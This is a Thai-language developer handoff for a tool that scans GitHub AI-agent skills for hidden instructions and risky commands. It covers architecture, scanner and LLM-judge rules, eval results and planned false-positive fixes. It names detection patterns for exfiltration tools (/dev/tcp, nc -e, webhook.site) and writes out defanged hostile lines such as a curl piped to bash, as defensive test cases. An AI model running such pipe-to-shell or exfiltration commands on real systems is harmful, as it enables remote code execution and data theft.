**ข้อควรรู้เรื่อง Gemini:** เอกสารของ Google ย้ายไป aistudio.google.com/docs และเน้น API ตัวใหม่ `/v1beta/interactions` (รูปแบบคำตอบแบบ REST ไม่ได้แสดงในเอกสาร จึงไม่ได้ใช้) แผนฟรีไม่มีตัวเลขโควตาที่เผยแพร่ในเอกสาร แต่หน้า AI Studio → Rate limits ของ "Default Gemini Project" (ภาพจากเจ้าของโปรเจกต์ 2026-11-11) แสดงของ **Gemini 3.5 Flash Lite: 15 RPM, 250K TPM, 500 RPD** (เทียบ Groq gpt-oss-120b: 30 RPM, 8K TPM, 1K RPD, 200K TPD) ตัวจำกัดของ Gemini คือจำนวนครั้งต่อนาที/วัน ไม่ใช่ขนาด prompt จึงส่งเนื้อหาให้อ่านได้มากกว่า Groq (ตอนนี้ตั้ง 30,000 ตัวอักษร ปรับเพิ่มได้ด้วย `JUDGE_MAX_INPUT_CHARS`) เว็บเตือน "nearing a rate limit, set up billing" เมื่อ eval ยิงใกล้ 15 RPM ไม่ต้องผูกบัญชีเรียกเก็บเงิน โควตาคิดต่อ project (ไม่ใช่ต่อ key) และรีเซ็ตเที่ยงคืนเวลา Pacific เมื่อเกินจะตอบ HTTP 429 `RESOURCE_EXHAUSTED` โดยเอกสารไม่ระบุ header บอกเวลารอ ค่า `parseRetryAfter` จึงเป็น 60 วินาทีเมื่อไม่มี header

---

## 1. โปรเจคนี้คืออะไร

เว็บที่ให้คนใส่ชื่อ repo บน GitHub (`owner/repo`) แล้วตรวจ AI agent skill (โฟลเดอร์ที่มี `SKILL.md`) ก่อนติดตั้ง
- หาข้อความที่ซ่อนไว้และคำสั่งเสี่ยง โดย**อ่านอย่างเดียว ไม่รันโค้ดใดๆ**
- มี LLM judge เป็นความเห็นที่สอง (ตอนนี้เปิดเฉพาะในเครื่อง)

| | |
|---|---|
| เว็บจริง | https://skill-auditor-phi.vercel.app (Vercel Hobby, push `main` แล้ว deploy เอง) |
| Repo | https://github.com/UJhinN/skill-auditor (public) |
| Database | Neon Postgres (Singapore) ต่อผ่าน Vercel integration โดยตั้ง prefix `DATABASE` จึงได้ `DATABASE_URL` |
| สเปกตัวสแกน | [`docs/scanner-spec.md`](scanner-spec.md) ผู้ใช้เป็นคนให้มา และเป็นเป้าหมายของการออกแบบ |
| แผนเดิม (Claude Docs) | https://claude.ai/artifact/2hpqZaMKANJ1XGqFZhF47B |

**เงื่อนไขของเจ้าของโปรเจค**
- ไม่ได้ทำเพื่อขาย ตอนนี้ใช้เองหรือแบ่งให้คนรู้จักไม่กี่คน
- ใช้ของฟรีทั้งหมด ถ้าจะจ่ายเงินต้องถามก่อน
- ผู้ใช้สื่อสารเป็นภาษาไทย
- ข้อความบนเว็บและในรายงานเป็นภาษาไทย

---

## 2. สถานะตอนนี้

**ทำเสร็จแล้ว** (commit ล่าสุดคือ `e44ec14` + commit ของ handoff นี้)
- เว็บสแกนได้ตั้งแต่ต้นจนจบ: ใส่ repo → ดึงไฟล์จาก GitHub → สแกน → บันทึกลง DB → หน้ารายงานที่ถามสถานะเป็นระยะจนเสร็จ
- **ตัวสแกนแบบกฎ (เวอร์ชัน 0.3.0)**
  - ชั้น A: ข้อความซ่อน
  - ชั้น B: คำสั่งเสี่ยง
  - correlation ระหว่างการอ่านข้อมูลลับกับการส่งข้อมูลออก
- **LLM judge** ใช้ Groq `openai/gpt-oss-120b` ด้วย free plan
  - ทำงานเมื่อมี `GROQ_API_KEY` ซึ่งตอนนี้มีแค่ใน `.env.local` ยังไม่ได้ใส่ใน Vercel
- **eval** (`npm run eval`, `npm run eval -- --judge`) ใช้ skill จริง 75 ตัว + เคสที่เขียนเอง 44 เคส ผลบันทึกไว้ใน README แล้ว
- **เทส** 134 ข้อ ผ่านหมด lint และ build ผ่าน

**ผลวัดล่าสุด (2026-11-11)**
- **กฎอย่างเดียว**
  - precision 95% ที่ high+
  - เตือนผิดกับ skill จริงทั่วไป 0/49 ที่ high+
  - จับได้ 56% ที่ high+ ถ้านับจุดบอดด้วย
- **กฎ + LLM** (ตรวจได้ 59/119 เคสก่อนโควตาหมด)
  - จับได้รวมจุดบอดเพิ่มจาก 53% → 88% ที่ high+
  - ยังไม่เตือนผิดเพิ่มกับ skill จริง 17 ตัวที่ตรวจแล้ว
  - **ยังไม่ได้ตรวจ** skill จริงทั่วไปอีก 32 ตัว และ skill สาย security 26 ตัว

**รอการตัดสินใจของผู้ใช้**
- จะเปิด LLM บนเว็บจริงไหม ผู้ใช้ขอให้วัดผลให้ครบก่อน
- ถ้าเปิด ขั้นตอนมีแค่ใส่ `GROQ_API_KEY` ใน Vercel → Settings → Environment Variables แล้ว redeploy

**งานที่ตั้งเวลาไว้ในแอป Claude (ไม่ใช่ Codex)**
- งาน "Skill Auditor: รัน eval LLM ต่อให้ครบ" จะรัน**ครั้งเดียว วันที่ 2026-11-12 เวลา 14:00 (UTC+7)**
- สิ่งที่มันทำ: รัน `eval --judge` ต่อจากที่ค้าง แล้วอัปเดตหัวข้อ "เพิ่ม LLM judge" ใน README และ **commit ในเครื่องโดยไม่ push**
- งานนี้รันได้เฉพาะตอนที่แอป Claude เปิดอยู่
- ถ้าทำงานใน Codex พร้อมกัน ให้ระวัง README conflict
- ถ้าไม่อยากให้มันรัน ให้ยกเลิกในเมนู Scheduled ของแอป Claude แล้วรัน `npm run eval -- --judge` เองแทน

---

## 3. การไหลของข้อมูล

```
ผู้ใช้กรอก owner/repo (src/app/repo-form.tsx)
  └─ POST /api/scans (src/app/api/scans/route.ts)
       ├─ ตรวจรูปแบบด้วย Zod + REPO_PATTERN (กัน SSRF: รับแค่ owner/repo ไม่รับ URL)
       ├─ getHead(): ถาม GitHub ว่า commit ล่าสุดคืออะไร
       ├─ cache: repo + commit + SCANNER_VERSION เดิม → คืน scan เดิม
       ├─ throttle: ทั้งระบบไม่เกิน 30 scan ใหม่ต่อ 10 นาที
       ├─ insert scans(status=pending) → ตอบ 202 {id} ทันที
       └─ after(() => runScan(...))  (src/lib/scan-job.ts) — ทำต่อหลังส่ง response แล้ว
            ├─ fetchSkill(): ดึง tree → planFiles() → ดึงไฟล์จาก raw.githubusercontent.com
            ├─ scanFiles(): ตัวสแกนแบบกฎ (src/lib/scanner)
            ├─ ถ้ามี judge: runJudge() (src/lib/judge) — ถ้าล้มเหลวจะใช้ผลจากกฎอย่างเดียว
            └─ insert findings + update scans(status=done, score, coverage)
หน้ารายงาน /scans/[id] (report.tsx) ถาม GET /api/scans/[id] ทุก 2 วินาทีจนสถานะเป็น done/failed
GET /api/scans/[id] เปลี่ยน scan ที่ค้าง pending/running เกิน 3 นาทีให้เป็น failed
```

---

## 4. รายละเอียดทุกไฟล์

### ราก repo
| ไฟล์ | หน้าที่ |
|---|---|
| `AGENTS.md` | คำสั่งสำหรับ agent (Codex อ่านไฟล์นี้อัตโนมัติ) ส่วน `nextjs-agent-rules` เป็นของ `next dev` ที่เขียนกลับมาเองทุกครั้ง ห้ามลบ |
| `README.md` | อธิบายโปรเจค (ภาษาไทย) + **ตารางผล eval ที่ต้องอัปเดตทุกครั้งที่วัดใหม่** |
| `package.json` | scripts: `dev`, `build`, `lint`, `test` (vitest), `eval` (tsx), `check:invisible`, `db:generate`, `db:migrate`, `db:studio` |
| `next.config.ts` | เปิด `cacheComponents` และ `partialPrefetching` ของ Next 16 (มีผลกับวิธีเขียน route และ page ดูหัวข้อ 6) |
| `drizzle.config.ts` | ตั้งค่า drizzle-kit โดยอ่าน `DATABASE_URL` จาก `.env.local` |
| `components.json` | ตั้งค่า shadcn/ui (style base-nova ใช้ `@base-ui/react` และ package `cn`) |
| `tsconfig.json`, `eslint.config.mjs` | ค่าเริ่มต้นของ create-next-app ตั้ง alias `@/*` → `src/*` |
| `.gitignore` | ไม่เก็บ `.env*` และ `/.eval-cache/` |
| `.env.local` | **ไม่อยู่ใน git** มี `DATABASE_URL` และ `GROQ_API_KEY` |

### `src/app` — หน้าเว็บและ API (Next.js 16 App Router)
| ไฟล์ | หน้าที่ |
|---|---|
| `layout.tsx` | ฟอนต์ Noto Sans Thai (ผูกกับตัวแปร `--font-sans`) + Geist Mono, `lang="th"` |
| `page.tsx` | หน้าแรก มีคำเตือนว่า "ไม่พบปัญหา ≠ ปลอดภัย" |
| `repo-form.tsx` | client component: ช่องกรอก + ปุ่มตัวอย่าง รับ URL GitHub ที่วางมาได้ด้วย แล้วแปลงเป็น `owner/repo` จากนั้น POST แล้วพาไป `/scans/[id]` |
| `api/health/route.ts` | `GET` ตรวจว่าต่อ DB ได้ (`select 1`) และบอกว่ามี `GITHUB_TOKEN` หรือไม่ ใช้ `connection()` เพื่อไม่ให้ถูก prerender |
| `api/scans/route.ts` | `POST` เริ่มสแกน (ดูหัวข้อ 3) ตั้ง `maxDuration = 60` เพราะงานใน `after()` อยู่ได้นานเท่าค่านี้ |
| `api/scans/[id]/route.ts` | `GET` คืนสถานะ, findings (เรียงตามความรุนแรง), riskLevel, coverage และเปลี่ยน scan ที่ค้างให้เป็น failed |
| `scans/[id]/page.tsx` | อ่าน `params` ภายใน `<Suspense>` (กติกาของ Cache Components) แล้วส่ง id ให้ `Report` |
| `scans/[id]/report.tsx` | client component: ถามสถานะทุก 2 วิ, แสดงคำตัดสิน (ไม่ใช้คำว่า "ปลอดภัย"), จำนวนตามระดับ, รายการ findings พร้อมลิงก์ไป GitHub ที่ commit นั้น, excerpt แสดงเป็นข้อความล้วน (กัน XSS), รายการ coverage และปุ่มคัดลอกลิงก์ |
| `globals.css` | Tailwind v4 + ธีมของ shadcn |

### `src/db` — ฐานข้อมูล (Drizzle + Neon HTTP)
| ไฟล์ | หน้าที่ |
|---|---|
| `schema.ts` | `scans` (id uuid สุ่ม, repo ตัวพิมพ์เล็ก, commit_sha, status enum, step, score, error, coverage jsonb, scanner_version, user_id ว่างได้, created/updated_at, index `(repo, commit_sha)`) และ `findings` (scan_id FK cascade, severity enum, rule, file, line, message, excerpt) โดยดึงรายการ severity มาจาก `lib/scanner/types.ts` |
| `index.ts` | สร้าง `db` จาก `DATABASE_URL` และ throw ทันทีถ้าไม่มี |
| `../../drizzle/*.sql` + `meta/` | migration 0000–0002 **ห้ามแก้ไฟล์เก่า** ให้สร้างใหม่ด้วย `npm run db:generate -- --name <ชื่อ>` แล้วรัน `npm run db:migrate` (DB ที่ใช้ในเครื่องกับบนเว็บเป็นตัวเดียวกัน) |

### `src/lib/scanner` — ตัวสแกนแบบกฎ (pure: ไม่แตะ DB หรือ network)
| ไฟล์ | หน้าที่ |
|---|---|
| `types.ts` | `SEVERITIES`, `SkillFile` (`totalBytes` ถ้าอ่านได้แค่บางส่วน), `Finding` (มี `decoded`, `source`, `confidence`), `ScanResult` (`riskLevel` = ระดับสูงสุด หรือ `none_found`) |
| `index.ts` | `scanFiles()` รันชั้น A+B ทุกไฟล์ text (ข้ามไฟล์ที่มี null byte), ตั้ง finding `hidden.oversized-file` และจำกัดไม่เกิน 10 finding ต่อ (ไฟล์, กฎ) / `finalize()` เรียงผลและคำนวณ risk กับ score / **`SCANNER_VERSION`** |
| `hidden.ts` | **ชั้น A** หา Unicode tags (ถอดออกมาเป็นข้อความ), bidi, zero-width (ยกเว้น emoji ZWJ, ธง, ตัวเชื่อมอักษรภาษาอาหรับและอินเดีย, BOM ต้นไฟล์), วลี override/ปิดบัง (`OVERRIDE_PATTERNS`), ข้ามการยืนยัน (`SKIP_CONFIRM_PATTERNS`, ระดับ medium), วลีที่อยู่ในเครื่องหมายคำพูดลดเป็น low (`hidden.quoted-injection-phrase`), CSS ซ่อน และ HTML comment (เฉพาะ `.md`), ก้อน base64 (ยกเว้น data URI) |
| `scripts.ts` | **ชั้น B** `RULES`: pipe-to-shell (ต้องมี URL หรือตัวแปร), encoded-exec, download-exec, credential-access, exfiltration, exfil-endpoint (webhook.site, `/dev/tcp`, `nc -e`), persistence, destructive, disable-security, privilege ข้าม comment ในไฟล์สคริปต์ (ใน `.md` ไม่ข้าม) และมี `markdownSeverity` ที่ลดระดับเมื่อเจอในเอกสาร / correlation `script.credential-exfil` |
| `score.ts` | คะแนน 0–100: หักตามน้ำหนักของแต่ละกฎ กฎเดิมที่ซ้ำหักเพิ่มได้ไม่เกิน +10 ถ้ามี critical คะแนนไม่เกิน 25 |
| `util.ts` | `fileKind` (markdown/html/script/other), `windows`/`findIn` (สแกนบรรทัดยาวทีละช่วง 4000 ตัว ซ้อนกัน 400), `isQuoted`, `reveal`/`excerpt` (ทำให้อักขระที่มองไม่เห็นกลายเป็น ⟦U+XXXX⟧), `lineLocator`, `SEVERITY_RANK` |
| `scanner.test.ts` | เทสของตัวสแกน รวมกลุ่ม "regressions from the eval" ที่กันไม่ให้การเตือนผิดที่แก้แล้วกลับมาอีก |

### `src/lib/judge` — LLM judge (ไม่ผูกกับผู้ให้บริการ)
| ไฟล์ | หน้าที่ |
|---|---|
| `index.ts` | `Judge` interface, `runJudge()` (สร้าง prompt → เรียก → ตรวจด้วย Zod → ลองใหม่ 1 ครั้ง → ตรวจหลักฐาน → รวมผล → `finalize`), `JudgeError`, `MockJudge`, `getJudge()` (คืน Groq ถ้ามี `GROQ_API_KEY`; `SCANNER_MODEL` ใช้เลือกโมเดล, `JUDGE_MAX_INPUT_CHARS` ใช้กำหนดงบเนื้อหา) |
| `prompt.ts` | `SYSTEM_PROMPT` (จากสเปก), `buildPrompt()` (nonce สุ่มใหม่ทุกครั้ง, ใส่เลขบรรทัด, manifest, static hints, ข้อความที่ถอดจากสิ่งซ่อน, ส่ง SKILL.md เสมอแต่ตัดถ้าใหญ่เกิน, ไฟล์อื่นส่งตามงบ), `orderForJudge()`, **`PROMPT_VERSION`** |
| `schema.ts` | Zod schema ของรายงาน (14 หมวด) + `judgeReportJsonSchema()` |
| `verify.ts` | ทิ้ง finding ที่ evidence ไม่อยู่ในไฟล์ที่ส่งไป ในช่วงบรรทัดที่อ้าง ±2 (ยุบ whitespace ก่อนเทียบ และรองรับ "…" ที่โมเดลใส่มา) |
| `merge.ts` | กฎการรวมผล: confidence ≥ 0.6; reviewer_manipulation = critical เสมอ; documentation_example สูงสุดแค่ low; ลดระดับ finding ของกฎได้ 1 ขั้นเมื่อมั่นใจ ≥ 0.8; `isProtected()` ห้ามลด hidden.* / credential-exfil / exfil-endpoint; finding จาก LLM ใช้ rule `llm.<category>` |
| `groq.ts` | `GroqJudge`: API แบบเดียวกับ OpenAI, `response_format` json_schema แบบ strict, temperature 0, `reasoning_effort: "low"`, จำกัด output 3000 token / ถ้าโดน 429 จะรอ (โหมด eval) หรือ throw `QuotaError` ทันที (โหมด production) / `toStrictSchema()` ตัดคีย์ min/max ออก |
| `judge.test.ts`, `groq.test.ts` | เทสทั้งหมดใช้ mock ไม่ยิง API จริง |

### `src/lib` อื่นๆ
| ไฟล์ | หน้าที่ |
|---|---|
| `github.ts` | `REPO_PATTERN`, `LIMITS` (400 ไฟล์ แบ่งให้แต่ละ skill ผลัดกัน, 1MB/ไฟล์, 5MB รวม; ไฟล์ใหญ่อ่านแค่ 256KB แรก + 64KB ท้าย), `GitHubError` (ข้อความไทยที่แสดงให้ผู้ใช้เห็นได้), `getHead`/`getCommit`/`getTree`, `planFiles()` (pure: หาโฟลเดอร์ skill แล้วเรียงลำดับ SKILL.md → scripts → อื่นๆ ข้าม binary), `fetchSkill()` (ทำทีละ 6 ไฟล์, ไฟล์ว่างไม่ดึงเพราะ raw ตอบ 501, ไฟล์ที่ดึงไม่ได้ลง coverage เป็น skipped), `stitchPartial()` / **ไม่ตาม redirect และทุกการเรียกมี timeout** |
| `github.test.ts` | เทส REPO_PATTERN และ planFiles |
| `scan-job.ts` | `runScan()` ที่ทำงานใน `after()` (ห้าม throw), `STALE_AFTER_MS` |
| `utils.ts` | `cn` สำหรับ shadcn |

### `src/components/ui` — shadcn (`button`, `card`, `input`) ปกติไม่ต้องแก้

### `scripts`
| ไฟล์ | หน้าที่ |
|---|---|
| `eval.ts` | วัดผล (ดูหัวข้อ 5) |
| `judge-smoke.ts` | เรียก judge จริง 1 ครั้ง: `npx tsx scripts/judge-smoke.ts malicious` (หรือ `clean`) ใช้โควตา Groq |
| `check-invisible.mjs` | `npm run check:invisible` (ใส่ `-- --fix` เพื่อแก้) ห้ามมีอักขระที่มองไม่เห็นแบบตัวจริงใน source |

### `fixtures` (ดู [`fixtures/README.md`](../fixtures/README.md))
- `clean/`, `malicious/` ใช้ใน unit test (ไฟล์ลงท้ายด้วย `.fixture`)
- `eval/benign.json` skill จริง 7 repo ที่ล็อก commit ไว้ ดึงมาตอนรัน ไม่ได้คัดลอกเข้ามาใน repo
- `eval/risky.json` (21) / `adversarial.json` (4, ในนั้นมี 1 จุดบอด) / `tricky.json` (10) / `gaps.json` (9)
- ทั้งหมด defang แล้ว: ใช้แค่ `example.com`/`.invalid`/IP สำหรับเอกสาร และ key ตัวอย่างของ AWS

### `docs`
- `scanner-spec.md` สเปกจากผู้ใช้
- `HANDOFF.md` ไฟล์นี้

---

## 5. วิธีรันในเครื่อง (Windows)

```bash
npm install
npm run dev                 # http://localhost:3000
npm test                    # offline ไม่เรียก LLM
npm run lint
npm run build               # build จะ type-check ด้วย (รวม scripts/)
npm run eval                # กฎอย่างเดียว ครั้งแรกดึง skill จริงมาเก็บใน .eval-cache/
npm run eval -- --judge     # + LLM ใช้โควตา Groq, cache ไว้ใน .eval-cache/judge/ และรันต่อจากที่ค้างได้
npm run check:invisible
npm run db:generate -- --name <ชื่อ> && npm run db:migrate
```

**Environment variables**
| ตัวแปร | ในเครื่อง | Vercel | หมายเหตุ |
|---|---|---|---|
| `DATABASE_URL` | ✅ | ✅ (มาจาก Neon integration) | ห้ามพิมพ์ค่าออกมา |
| `GROQ_API_KEY` | ✅ | ❌ | ถ้ามีค่า judge จะเปิด |
| `GROQ_MODEL` (ชื่อเดิม `SCANNER_MODEL` ยังใช้ได้) | — | — | ค่าเริ่มต้นคือ `openai/gpt-oss-120b` |
| `GEMINI_API_KEY` | ยังไม่มี | ❌ | judge ตัวที่สอง ดูบันทึกของ Claude ด้านบน |
| `GEMINI_MODEL`, `GEMINI_REASONING_EFFORT` | — | — | ค่าเริ่มต้น `gemini-3.5-flash-lite` และไม่ส่ง `reasoning_effort` |
| `JUDGE_PROVIDERS` | — | — | ลำดับที่ลอง เช่น `groq,gemini` ค่าเริ่มต้น `groq` ตัวเดียว (eval ไม่อ่านค่านี้) |
| `JUDGE_MAX_INPUT_CHARS` | — | — | ค่าเริ่มต้นของ Groq คือ 14000 (เพราะเพดาน 8K token/นาที) |
| `GITHUB_TOKEN` | — | ❌ | ไม่ใส่ก็ได้ ถ้าใส่จะได้โควตา API มากขึ้น ผู้ใช้เลือกยังไม่ทำ |

**เรื่องเฉพาะของเครื่องนี้**
- Node 26 และ GitHub CLI ติดตั้งผ่าน winget ถ้า shell ใหม่หา `node` ไม่เจอ ให้โหลด PATH ใหม่จาก registry หรือเรียกด้วย path เต็ม `C:\Program Files\nodejs\node.exe`
- `gh` login เป็น `UJhinN` แล้ว `git push` ใช้ได้
- git identity ของ repo นี้ตั้งเป็น `natdanai <natdanai@users.noreply.github.com>` แบบ local ตั้งใจไม่ใช้อีเมลจริง
- `package.json` ไม่มี `"type": "module"` สคริปต์ `.ts` ที่รันด้วย tsx จึงใช้ top-level await ไม่ได้ ต้องห่อด้วย `main()`

---

## 6. กฎที่ห้ามพลาด

1. **ห้ามรัน import หรือ eval เนื้อหาที่สแกนเด็ดขาด** และห้ามเปิด URL ที่เจอในไฟล์ ให้คุยกับ `api.github.com` และ `raw.githubusercontent.com` เท่านั้น
2. **แก้กฎของตัวสแกนเมื่อไหร่ ต้อง bump `SCANNER_VERSION`** (ใน `src/lib/scanner/index.ts`) ไม่งั้นเว็บจะดึงผลเก่าจาก cache มาใช้
   ⚠️ ผลกระทบตามมา: cache ของ judge ใน eval ผูกกับ `SCANNER_VERSION` + `PROMPT_VERSION` พอ bump แล้ว เคสที่ judge ตรวจไปแล้วต้องตรวจใหม่ทั้งหมด ซึ่งกินโควตา Groq ทั้งวัน **อย่า bump ก่อน eval รอบวันที่ 12 พ.ย. จะเสร็จ** ถ้าเลี่ยงไม่ได้ ให้แจ้งผู้ใช้ก่อน
3. **ห้ามเพิ่มกฎที่ไม่มี fixture** และห้ามเปลี่ยนเกณฑ์โดยไม่มีผล eval (กติกาจากสเปก)
   - เคยมีกฎที่เพิ่มเข้ามาจากการเดา ("silently … run") แล้วทำให้เตือนผิด 2 จุดกับ skill จริง
   - ทุกครั้งที่แก้กฎ ให้รัน `npm run eval` แล้วอัปเดต README
4. **ห้ามมีอักขระที่มองไม่เห็นแบบตัวจริงใน source** ให้เขียนเป็น escape (`\u` + เลขฐานสิบหก 4 ตัว หรือ `\u{...}`) เครื่องมือ AI บางตัวแปลง escape เป็นตัวอักษรจริงตอนเขียนไฟล์ จึงต้องรัน `npm run check:invisible` ก่อน commit ทุกครั้ง
5. **Next.js 16 ไม่เหมือนที่โมเดลส่วนใหญ่จำได้** ให้อ่าน `node_modules/next/dist/docs/` ก่อนเขียนโค้ดฝั่ง Next
   - เปิด Cache Components ไว้: config อย่าง `dynamic`/`revalidate`/`runtime` ใช้ไม่ได้
   - page ที่อ่าน `params` ต้องอยู่ใน `<Suspense>`
   - GET route ที่ไม่อ่านข้อมูลจาก request ต้องเรียก `connection()`
   - `params` เป็น Promise
   - type ของ route (`RouteContext`, `PageProps`) สร้างตอน `next build`/`next dev` ถ้า `tsc` บ่นเรื่อง route type ให้ build ก่อน
6. **Database แก้ผ่าน migration เท่านั้น** ห้ามแก้ใน Neon ด้วยมือ ในเครื่องกับบนเว็บใช้ DB ตัวเดียวกัน migration จึงมีผลกับเว็บจริงทันที
7. **Secret**
   - ห้าม commit `.env*`
   - ห้ามพิมพ์ค่า key หรือ connection string ออกมา (ถ้าต้องตรวจ ให้ดูแค่รูปแบบ เช่น prefix และความยาว)
   - ถ้าผู้ใช้วาง secret ในแชท ให้บอกให้ใส่ในไฟล์แทน
8. **รายงานบรรยายหลักฐาน ไม่กล่าวหาคน** ห้ามใช้คำว่า "ปลอดภัย" ผลที่ดีที่สุดคือ "ไม่พบปัญหาที่รู้จัก"
9. **ข้อความที่แสดงให้ผู้ใช้เห็น** (message ใน finding, ข้อความ error ของ API) เป็นภาษาไทย ส่วนชื่อกฎและ comment ในโค้ดเป็นภาษาอังกฤษ
10. **commit** ลงท้ายด้วย `Co-Authored-By` ตามเครื่องมือที่ใช้ push ตรงเข้า `main` ได้ (ผู้ใช้ทำแบบนี้มาตลอด) แต่ควรรัน lint + test + build ก่อน push ทุกครั้ง เพราะ push แล้วขึ้นเว็บจริงทันที

---

## 7. ข้อจำกัดที่รู้แล้ว

- **Groq free plan** (`gpt-oss-120b`): 1,000 ครั้ง/วัน, 8,000 token/นาที, ประมาณ 200K token/วัน
  - eval หนึ่งรอบใช้โควตาทั้งวัน
  - ถ้าเปิดบนเว็บจริง จะสแกนด้วย LLM ได้ราว 30–40 ครั้ง/วัน เกินกว่านั้นจะใช้กฎอย่างเดียว
  - โควตาคิดต่อ organization สร้าง key เพิ่มก็ไม่ช่วย
- **GitHub API แบบไม่มี token**: 60 ครั้ง/ชม. ต่อ IP และบน Vercel ต้องแชร์ IP กับคนอื่น ใช้ 2 ครั้งต่อการสแกน (cache ช่วยลดได้)
- **จำกัด 400 ไฟล์และ 5 MB ต่อ repo** แบ่งให้ทุก skill ผลัดกันตามความสำคัญของไฟล์แล้ว (ดูบันทึกของ Claude ด้านบน) repo แบบแค็ตตาล็อกที่มี skill หลายร้อยตัวยังอ่านไม่ครบ และรายงานจะระบุไฟล์ที่ข้ามเสมอ
- **`after()` บน Vercel อยู่ได้ไม่เกิน `maxDuration` (60s)** การสแกนที่มี judge ใช้เวลาราว 10–20s ยังไม่เกิน
- **ยังไม่ได้ทำ**: จำกัดต่อ IP, Content-Security-Policy, login (ตัดสินใจไว้ว่ายังไม่ต้องมี)

---

## 8. งานถัดไป (เรียงตามที่แนะนำ)

**ทำก่อนข้ออื่น แต่ต้องรอหลัง eval ที่ตั้งเวลาไว้ (2026-11-12 14:00) รันเสร็จและ commit README แล้ว — เจ้าของโปรเจกต์ตกลงแล้ว (Claude, 2026-11-11)**
แก้การเตือนผิดที่เจอกับ repo จริง `K-Dense-AI/scientific-agent-skills` (commit `2d2065fb4520fa3f3f2bcf61cff26ec8b7eba4b5`, รายงานบนเว็บจริงได้ "วิกฤต 20/100" จาก 14 รายการ ทั้งที่ตรวจโค้ดจริงแล้วไม่มีรายการไหนเป็นอันตราย) ต้อง bump `SCANNER_VERSION` ซึ่งทำให้ cache ผล AI ของ eval ใช้ไม่ได้ จึงต้องรอ eval รอบนั้นเสร็จก่อน และไม่ควรเพิ่มเคสใหม่ในชุดวัดผลก่อนหน้านั้น เพราะจะทำให้ตัวเลขเทียบกับผลเดิมไม่ได้

| กฎ | บั๊ก | แนวทางแก้ |
|---|---|---|
| `script.pipe-to-shell` (ต้นเหตุของ "วิกฤต" 4 รายการ) | `curl … \| python3 arxiv_atom.py -` ถูกนับว่ารันโค้ดจาก internet ทั้งที่รันไฟล์ในเครื่องและ pipe แค่**ข้อมูล**เข้า stdin | ตัวแปลภาษา (`sh`, `bash`, `python3`, `node` …) ที่รับ pipe ต้องไม่มีชื่อไฟล์สคริปต์ตามหลัง (มีได้แค่แฟลกอย่าง `-`, `-s`, `-c`) `python3 -` อ่านโปรแกรมจาก stdin จึงยังต้องจับ ส่วน `python3 script.py -` ไม่ใช่ |
| `hidden.encoded-blob` | สตริงตัวอักษรล้วนยาวเกิน 200 ตัวถูกนับเป็น base64 (เจอกับลำดับโปรตีน GFP ใน `diffdock/scripts/prepare_batch_csv.py:207`) | base64 จริงมีทั้งตัวพิมพ์เล็ก ตัวพิมพ์ใหญ่ และตัวเลข ให้ตรวจครบทั้งสามอย่างก่อน ลำดับ DNA/โปรตีนจะไม่โดน |
| `script.exfiltration` | ทุก `requests.post` / `fetch POST` ถูกเตือนระดับ medium แม้ส่งไป API ที่ skill ประกาศ (OpenRouter, parallel.ai พร้อม key ของผู้ใช้เอง) ซึ่งสเปกบอกว่าไม่ใช่ finding | ลดเป็น info หรือเตือนเมื่อมีการอ่านข้อมูลลับในไฟล์เดียวกัน (`script.credential-exfil` ยังทำงานตามเดิม) ส่วน `curl -d @ไฟล์` / `--data-binary @ไฟล์` (ส่งไฟล์ในเครื่อง) ให้คงระดับเดิม |
| `script.disable-security` (`verify=False`) | จับทั้งประโยคที่เตือนว่า "never use `verify=False`" (`labarchive-integration/SKILL.md:183`) และพารามิเตอร์ของไลบรารีอื่นที่ไม่เกี่ยวกับ SSL (`scikit-bio/SKILL.md:318`) | ข้ามถ้าบรรทัดมีคำปฏิเสธ (`never`, `don't`, `avoid`, `ห้าม`) และใน markdown ให้เตือนเฉพาะเมื่อบรรทัดเดียวกันพูดถึง `requests`/`httpx`/`ssl`/`tls`/`https`/certificate |

ขั้นตอน: (1) เขียนเคสสำหรับ `fixtures/eval/tricky.json` จากบรรทัดจริง 7 บรรทัดข้างบน (ย่อให้สั้นและ defang แล้ว ไม่ต้องคัดลอกไฟล์ทั้งหมด) และเคสอันตรายคู่กันที่ต้องยังจับได้ เช่น `curl https://example.com/x.sh | bash`, `curl … | python3 -`, `base64` ผสมตัวเลข (2) รัน `npm run eval` ให้เห็นว่าเคสใหม่ล้มก่อนแก้ (3) แก้ 4 กฎ (4) bump `SCANNER_VERSION` เป็น `0.3.2` (5) รัน `npm run eval` และ `npm run eval -- --judge` (ใช้โควตา Groq ทั้งวัน เพราะ cache เก่าใช้ไม่ได้) แล้วอัปเดต README (6) สแกน `K-Dense-AI/scientific-agent-skills` บนเว็บจริงซ้ำ ผลต้องไม่เป็นวิกฤต เหลือแค่ระดับต่ำ (sudo ในคำแนะนำติดตั้ง) พร้อมส่งต่อให้เจ้าของโปรเจกต์ลองเทส

หมายเหตุ: รายงานของ `trailofbits/skills` ที่ถูกสแกนบนเว็บจริงไว้ที่ 200 ไฟล์ (ก่อนเพดานใหม่ 400) ก็จะรีเฟรชเมื่อ bump เวอร์ชัน

1. **ให้หน้ารายงานแสดงผลจาก AI** ⭐ ต้องมีก่อนเปิด LLM บนเว็บ และไม่ต้อง bump `SCANNER_VERSION`
   - เพิ่ม migration ให้ `scans` มีคอลัมน์ เช่น `judge_model`, `stated_purpose`, `observed_behaviors` (jsonb), `purpose_mismatch` (jsonb), `dual_use`, `judge_status` (`ran`/`skipped`/`failed`/`quota`)
   - `scan-job.ts` บันทึกค่าเหล่านี้จาก `JudgeOutcome` และตั้ง `judge_status` ตอนล้มเหลวหรือโควตาหมด (ตอนนี้แค่ log ไว้)
   - `GET /api/scans/[id]` ส่งค่าใหม่ออกไป และส่ง `source`/`confidence` ของแต่ละ finding ด้วย (ต้องเพิ่มคอลัมน์ใน `findings`)
   - `report.tsx`
     - แสดง "skill บอกว่าทำ" กับ "ถ้าทำตามทุกคำสั่งจะ…"
     - ถ้า `purpose_mismatch.present` ให้แสดงเป็นคำเตือนเด่นๆ
     - มีป้าย "AI" ที่ finding จาก LLM พร้อมความมั่นใจ
     - แสดง coverage ฝั่ง LLM (`CoverageEntry.llm`)
     - ถ้า AI ไม่ได้อ่าน ให้บอกตรงๆ
   - ข้อความที่มาจาก LLM ให้แสดงเป็นข้อความล้วนเสมอ (React escape ให้อยู่แล้ว ห้ามใช้ `dangerouslySetInnerHTML`)
